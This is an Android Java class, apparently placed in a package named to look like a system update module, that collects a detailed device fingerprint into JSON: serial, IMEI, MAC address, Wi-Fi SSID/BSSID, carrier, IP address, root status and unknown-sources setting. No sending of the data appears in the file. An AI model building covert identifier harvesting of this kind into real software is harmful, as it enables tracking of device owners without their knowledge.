package com.android.system.update.modules;

import android.app.ActivityManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class DeviceModule {
    private Context context;
    
    public DeviceModule(Context context) {
        this.context = context;
    }
    
    public String getDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            
            // 1. Device Identification
            collectDeviceIdentification(info);
            
            // 2. Hardware Information
            collectHardwareInfo(info);
            
            // 3. Operating System Information
            collectOSInfo(info);
            
            // 4. Memory and Storage
            collectMemoryAndStorage(info);
            
            // 5. Network Information
            collectNetworkInfo(info);
            
            // 6. Display Information
            collectDisplayInfo(info);
            
            // 7. Security Information
            collectSecurityInfo(info);
            
            // 8. Localization Information
            collectLocalizationInfo(info);
            
            // 9. Performance Metrics
            collectPerformanceMetrics(info);
            
            return info.toString(4); // Pretty print with 4 spaces
            
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    private void collectDeviceIdentification(JSONObject info) throws Exception {
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("model", Build.MODEL);
        info.put("brand", Build.BRAND);
        info.put("product", Build.PRODUCT);
        info.put("device", Build.DEVICE);
        info.put("hardware", Build.HARDWARE);
        info.put("serial", Build.SERIAL);
        info.put("bootloader", Build.BOOTLOADER);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            info.put("radio_version", Build.getRadioVersion());
        }
    }
    
    private void collectHardwareInfo(JSONObject info) throws Exception {
        // CPU information
        info.put("cpu_abi", Build.CPU_ABI);
        info.put("cpu_abi2", Build.CPU_ABI2);
        info.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        
        // Get CPU info from /proc/cpuinfo
        try {
            Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.toLowerCase().contains("processor")) {
                    String[] parts = line.split(":");
                    if (parts.length > 1) {
                        info.put("processor_info", parts[1].trim());
                        break;
                    }
                }
            }
            reader.close();
        } catch (Exception e) {
            info.put("processor_info", "Unknown");
        }
    }
    
    private void collectOSInfo(JSONObject info) throws Exception {
        info.put("os_version", Build.VERSION.RELEASE);
        info.put("sdk_int", Build.VERSION.SDK_INT);
        info.put("build_id", Build.DISPLAY);
        info.put("fingerprint", Build.FINGERPRINT);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            info.put("security_patch", Build.VERSION.SECURITY_PATCH);
        }
        info.put("kernel_version", System.getProperty("os.version"));
    }
    
    private void collectMemoryAndStorage(JSONObject info) throws Exception {
        // RAM information
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (activityManager != null) {
            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
            activityManager.getMemoryInfo(memInfo);
            info.put("total_ram", formatBytes(memInfo.totalMem));
            info.put("available_ram", formatBytes(memInfo.availMem));
            info.put("low_memory", memInfo.lowMemory);
            info.put("ram_threshold", formatBytes(memInfo.threshold));
        }
        
        // Internal storage
        StatFs internalStatFs = new StatFs(Environment.getDataDirectory().getPath());
        info.put("internal_total", formatBytes(internalStatFs.getTotalBytes()));
        info.put("internal_free", formatBytes(internalStatFs.getAvailableBytes()));
        info.put("internal_used", formatBytes(internalStatFs.getTotalBytes() - internalStatFs.getAvailableBytes()));
        
        // External storage (if available)
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            StatFs externalStatFs = new StatFs(Environment.getExternalStorageDirectory().getPath());
            info.put("external_total", formatBytes(externalStatFs.getTotalBytes()));
            info.put("external_free", formatBytes(externalStatFs.getAvailableBytes()));
            info.put("external_used", formatBytes(externalStatFs.getTotalBytes() - externalStatFs.getAvailableBytes()));
        } else {
            info.put("external_storage", "Not available");
        }
    }
    
    private void collectNetworkInfo(JSONObject info) throws Exception {
        JSONObject networkInfo = new JSONObject();
        
        // Mobile network info
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null) {
            networkInfo.put("carrier", tm.getNetworkOperatorName());
            networkInfo.put("sim_country", tm.getSimCountryIso());
            networkInfo.put("network_type", getNetworkType(tm.getNetworkType()));
            networkInfo.put("phone_type", getPhoneType(tm.getPhoneType()));
            
            // IMEI/Device ID - handle permissions properly
            if (checkPermission(android.Manifest.permission.READ_PHONE_STATE)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    networkInfo.put("device_id", "Restricted (Android 10+)");
                } else {
                    String deviceId = tm.getDeviceId();
                    networkInfo.put("device_id", deviceId != null ? deviceId : "Unknown");
                }
            } else {
                networkInfo.put("device_id", "Permission required");
            }
        }
        
        // WiFi info
        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null && wm.isWifiEnabled()) {
            networkInfo.put("wifi_mac", getWifiMacAddress());
            networkInfo.put("ip_address", Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress()));
            String ssid = wm.getConnectionInfo().getSSID();
            networkInfo.put("ssid", ssid != null ? ssid.replace("\"", "") : "Unknown");
            networkInfo.put("bssid", wm.getConnectionInfo().getBSSID());
            networkInfo.put("link_speed", wm.getConnectionInfo().getLinkSpeed() + " Mbps");
            networkInfo.put("rssi", wm.getConnectionInfo().getRssi() + " dBm");
        }
        
        // Network connectivity
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null) {
                networkInfo.put("network_connected", activeNetwork.isConnected());
                networkInfo.put("network_type_name", activeNetwork.getTypeName());
                networkInfo.put("network_subtype_name", activeNetwork.getSubtypeName());
                networkInfo.put("network_roaming", activeNetwork.isRoaming());
            }
        }
        
        info.put("network", networkInfo);
    }
    
    private void collectDisplayInfo(JSONObject info) throws Exception {
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);
            
            JSONObject displayInfo = new JSONObject();
            displayInfo.put("width", metrics.widthPixels);
            displayInfo.put("height", metrics.heightPixels);
            displayInfo.put("density", metrics.density);
            displayInfo.put("density_dpi", metrics.densityDpi);
            displayInfo.put("scaled_density", metrics.scaledDensity);
            displayInfo.put("xdpi", metrics.xdpi);
            displayInfo.put("ydpi", metrics.ydpi);
            displayInfo.put("refresh_rate", wm.getDefaultDisplay().getRefreshRate());
            
            info.put("display", displayInfo);
        }
    }
    
    private void collectSecurityInfo(JSONObject info) throws Exception {
        JSONObject securityInfo = new JSONObject();
        securityInfo.put("rooted", checkRoot());
        securityInfo.put("debuggable", (Build.FINGERPRINT.startsWith("generic") ||
                Build.FINGERPRINT.contains("test-keys") ||
                Build.TAGS != null && Build.TAGS.contains("test-keys")));
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            securityInfo.put("verified_boot_state", Build.VERSION.SECURITY_PATCH);
        }
        
        // Check if device is in secure mode
        try {
            android.provider.Settings.Secure.getInt(context.getContentResolver(),
                    android.provider.Settings.Secure.INSTALL_NON_MARKET_APPS);
            securityInfo.put("unknown_sources", true);
        } catch (android.provider.Settings.SettingNotFoundException e) {
            securityInfo.put("unknown_sources", false);
        }
        
        info.put("security", securityInfo);
    }
    
    private void collectLocalizationInfo(JSONObject info) throws Exception {
        JSONObject localizationInfo = new JSONObject();
        localizationInfo.put("country", Locale.getDefault().getCountry());
        localizationInfo.put("language", Locale.getDefault().getLanguage());
        localizationInfo.put("display_language", Locale.getDefault().getDisplayLanguage());
        localizationInfo.put("timezone", java.util.TimeZone.getDefault().getID());
        
        info.put("localization", localizationInfo);
    }
    
    private void collectPerformanceMetrics(JSONObject info) throws Exception {
        JSONObject performanceInfo = new JSONObject();
        performanceInfo.put("uptime", SystemClock.elapsedRealtime());
        performanceInfo.put("boot_time", System.currentTimeMillis() - SystemClock.elapsedRealtime());
        
        info.put("performance", performanceInfo);
    }
    
    private String getWifiMacAddress() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return "02:00:00:00:00:00"; // Random MAC on Android 10+
        }
        
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : interfaces) {
                if (!nif.getName().equalsIgnoreCase("wlan0"))
                    continue;
                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null)
                    return "02:00:00:00:00:00";
                
                StringBuilder sb = new StringBuilder();
                for (byte b : macBytes) {
                    sb.append(String.format("%02X:", b));
                }
                if (sb.length() > 0)
                    sb.deleteCharAt(sb.length() - 1);
                return sb.toString();
            }
        } catch (Exception ignored) {
        }
        return "02:00:00:00:00:00";
    }
    
    private String getNetworkType(int type) {
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
            case TelephonyManager.NETWORK_TYPE_EDGE:
            case TelephonyManager.NETWORK_TYPE_CDMA:
            case TelephonyManager.NETWORK_TYPE_1xRTT:
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "2G";
            case TelephonyManager.NETWORK_TYPE_UMTS:
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
            case TelephonyManager.NETWORK_TYPE_HSDPA:
            case TelephonyManager.NETWORK_TYPE_HSUPA:
            case TelephonyManager.NETWORK_TYPE_HSPA:
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
            case TelephonyManager.NETWORK_TYPE_EHRPD:
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                return "3G";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "4G";
            case TelephonyManager.NETWORK_TYPE_NR:
                return "5G";
            default:
                return "Unknown";
        }
    }
    
    private String getPhoneType(int type) {
        switch (type) {
            case TelephonyManager.PHONE_TYPE_NONE:
                return "None";
            case TelephonyManager.PHONE_TYPE_GSM:
                return "GSM";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "CDMA";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "SIP";
            default:
                return "Unknown";
        }
    }
    
    private boolean checkRoot() {
        String[] paths = {
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su",
                "/system/bin/.ext/su",
                "/system/usr/we-need-root/su",
                "/system/xbin/mu"
        };
        
        // Check if test-keys exist
        String buildTags = Build.TAGS;
        if (buildTags != null && buildTags.contains("test-keys")) {
            return true;
        }
        
        // Check for Superuser.apk or su binary
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        
        // Check if su exists in PATH
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            return in.readLine() != null;
        } catch (Exception e) {
            return false;
        }
    }
    
    private String formatBytes(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp - 1) + "";
        return String.format("%.2f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
    private boolean checkPermission(String permission) {
        return context.checkCallingOrSelfPermission(permission) == android.content.pm.PackageManager.PERMISSION_GRANTED;
    }
}
